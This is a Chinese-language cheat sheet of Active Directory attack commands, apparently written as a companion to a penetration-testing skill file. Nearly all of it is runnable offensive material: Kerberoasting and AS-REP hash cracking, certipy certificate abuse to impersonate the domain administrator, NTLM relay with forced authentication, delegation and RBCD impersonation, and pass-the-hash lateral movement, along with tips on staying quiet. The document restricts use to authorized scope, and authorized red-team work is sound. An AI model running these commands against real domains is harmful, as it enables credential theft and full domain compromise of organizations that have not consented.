# AD 攻击链速查（命令 + 判据）

> 配套 `SKILL.md`。所有命令仅在授权范围内使用。占位符：`<domain>`、`<DC_IP>`、`<user>`、`<pass>`、`<ntlm>`、`<target>`。

## 0. 先固定变量

```bash
export DOMAIN='corp.local'
export DC='10.0.0.10'
export USER='alice'
export PASS='P@ssw0rd'
# 时间同步（Kerberos 5 分钟容忍）
sudo chronyc makestep || sudo ntpdate -u "$DC"
```

证据目录建议：

```bash
mkdir -p evidence/{enum,kerb,adcs,relay,lateral}
date -Is | tee evidence/run.start
```

## 1. 域信息与只读枚举

```bash
# 主机/域/策略
nxc smb "$DC" -u "$USER" -p "$PASS" -d "$DOMAIN"
nxc smb "$DC" --pass-pol -u '' -p ''
nxc ldap "$DC" -u "$USER" -p "$PASS" -d "$DOMAIN" --users --groups --gmsa
# 直接查 LDAP
ldapsearch -x -H "ldap://$DC" -D "$USER@$DOMAIN" -w "$PASS" \
  -b "dc=${DOMAIN%%.*},dc=${DOMAIN#*.}" \
  '(objectClass=user)' sAMAccountName memberOf servicePrincipalName
```

关注：`userAccountControl` 含 `DONT_REQ_PREAUTH`（AS-REP 可打）、`TRUSTED_FOR_DELEGATION`；`msDS-AllowedToDelegateTo`；`adminCount=1`；`servicePrincipalName` 非空的服务账号。

判据：能列出域用户/组/SPN/委派属性，且至少一条指向高权路径（Domain Admins 成员、ACL 可写、可注册模板）。

## 2. BloodHound 采集

```bash
bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -ns "$DC" -c All --zip
# Windows
SharpHound.exe -c All --zipfilename bh.zip
```

导入后优先看：

- `Shortest Paths to Domain Admins`
- `Kerberoastable Users` / `AS-REP Roastable Users`
- `Unconstrained Delegation` / `Constrained Delegation` / `RBCD`
- `WriteDACL` / `GenericAll` / `ForceChangePassword` / `AddMember`
- `ADCS` 节点（ESC 模板）
- `Sessions` 与本地管理员复用

判据：图上存在从当前主体到 Tier0 的**可执行边**，且每条边有对应验证命令（不是只有"可能"）。

## 3. Kerberoasting / AS-REP

```bash
# Kerberoast：申请 RC4 TGS，离线破解
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" -request \
  -outputfile evidence/kerb/kerb.hash
hashcat -m 13100 evidence/kerb/kerb.hash /usr/share/wordlists/rockyou.txt

# AS-REP：无需预认证的账号
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC" -usersfile users.txt \
  -format hashcat -outputfile evidence/kerb/asrep.hash
hashcat -m 18200 evidence/kerb/asrep.hash /usr/share/wordlists/rockyou.txt
```

降噪：只请求目标 SPN，不要全量循环；优先 AES 账号（`-aes` 不适用时至少避免高频重试）。

判据：hash 被破解出明文，或该 hash 可直接用于 PtH / 申请票据。**仅拿到 hash 未破解 = 素材，不是提权证据。**

## 4. ADCS：ESC1-8

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout
certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca '<CA>' -template '<Tpl>' \
  -upn 'administrator@'"$DOMAIN" -dc-ip "$DC"
certipy auth -pfx administrator.pfx -dc-ip "$DC"
```

| ESC | 条件 | 利用要点 |
|---|---|---|
| ESC1 | 模板允许 SAN + 低权 Enroll | 指定 `-upn administrator` 申请证书 |
| ESC2 | 模板 Any Purpose / 无 EKU | 当通用证书用，可做客户端认证 |
| ESC3 | 注册代理模板 | 用代理证书代签任意用户 |
| ESC4 | 模板 ACL 可写 | 先改模板开 SAN/EKU，再走 ESC1 |
| ESC5 | PKI 对象 ACL 可写 | 改 CA/模板对象权限 |
| ESC6 | CA 允许 SAN（EDITF_ATTRIBUTESUBJECTALTNAME2） | 任意模板都可塞 SAN |
| ESC7 | CA 管理权限（ManageCA/ManageCertificates） | 批证书/改 CA 配置 |
| ESC8 | HTTP 注册端点 + NTLM | relay 到 `/certsrv/` 拿证书 |

判据：`certipy auth` 返回目标用户 TGT 或 `Got hash`，并能用该凭据访问目标资源。只有 `find` 报 vulnerable 不算。

## 5. NTLM relay 与强制认证

```bash
# 先确认签名状态
nxc smb <target> -u '' -p '' --gen-relay-list relay_targets.txt
# relay（SMB -> SMB / LDAP / ADCS HTTP）
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks -of evidence/relay
# 强制认证（需单独授权）
petitpotam.py <listener_ip> <target_ip>
# 或 printerbug / dfscoerce
```

前提：目标未强制 SMB signing、LDAP signing/EPA 未开；relay 到 LDAP 需 `LDAP signing not required`。

判据：relay 成功建立会话（`socks` 可用）或拿到 ADCS 证书；仅有入站认证请求不算。

## 6. 委派

```bash
# Constrained：S4U2Self + S4U2Proxy
impacket-getST -spn 'cifs/<target>' -impersonate administrator \
  "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass "$DOMAIN/administrator@<target>"

# Unconstrained：控制被委派主机后导出 TGT
Rubeus.exe monitor /interval:5 /nowrap
# Linux：krbrelayx / impacket 侧抓取
```

RBCD：

```bash
# 需要能写目标 msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-addcomputer "$DOMAIN/$USER:$PASS" -computer-name 'EVIL$' -computer-pass 'P@ss1234'
rbcd.py -action write -delegate-to '<target>$' -delegate-from 'EVIL$' "$DOMAIN/$USER:$PASS"
impacket-getST -spn 'cifs/<target>' -impersonate administrator "$DOMAIN/EVIL$:P@ss1234"
```

判据：以目标身份拿到服务票据并成功远程执行（`whoami` 返回目标身份）。

## 7. 横向：PtH / WMI / WinRM / SMB

```bash
nxc smb   <target> -u "$USER" -H "$NTLM" -d "$DOMAIN" --shares
nxc wmi   <target> -u "$USER" -H "$NTLM" -d "$DOMAIN" -x 'whoami /all'
nxc winrm <target> -u "$USER" -H "$NTLM" -d "$DOMAIN" -x 'whoami /all'
impacket-psexec  "$DOMAIN/$USER@<target>" -hashes ":$NTLM"
impacket-wmiexec "$DOMAIN/$USER@<target>" -hashes ":$NTLM"
```

顺序：WinRM（5985/5986，最安静）→ WMI → SMB → psexec（创建服务，7045 告警）。

判据：目标机返回 `whoami` 且身份为预期高权账号；同时记录主机名、IP、账号、权限、时间。

## 8. 常见失败与处理

| 现象 | 原因 | 处理 |
|---|---|---|
| `KRB_AP_ERR_SKEW` | 时钟偏移 >5min | 同步时间后重试 |
| `STATUS_LOGON_FAILURE` 连续出现 | 密码错/锁定风险 | 立即停，核对来源，勿重试 |
| `ntlmrelayx` 无会话 | signing/EPA 开启 | 换目标或改打 ADCS HTTP |
| `certipy req` 拒绝 | 无 Enroll / 需审批 | 查模板 ACL 与 `manager approval` |
| `getST` 失败 | SPN 错/委派未配 | 核对 `msDS-AllowedToDelegateTo` |
| BloodHound 空图 | 采集账号权限低 | 换账号或补 LDAP 查询 |

## 9. 取证清单

- 每条路径：源主体 → 动作 → 目标主体 → 结果
- 凭据：类型、来源、有效期、指纹（SHA256 前 8 位），不回传明文
- 提权：前后 `whoami /all`、组成员、`net group "Domain Admins" /domain`
- 时间线：命令时间、目标日志时间（4624/4625/4768/4769/7045）
- 清理：删除上传工具、计划任务、临时账号；记录清理命令

## 10. 判据复核

1. 换一台干净机器按记录重放，能得到同一凭据/同一权限？
2. 有客观输出证明权限级别变化？
3. 证据能支撑报告复现且已脱敏？

三条全满足才写"已打穿"；否则写"待验证"并给出下一步。
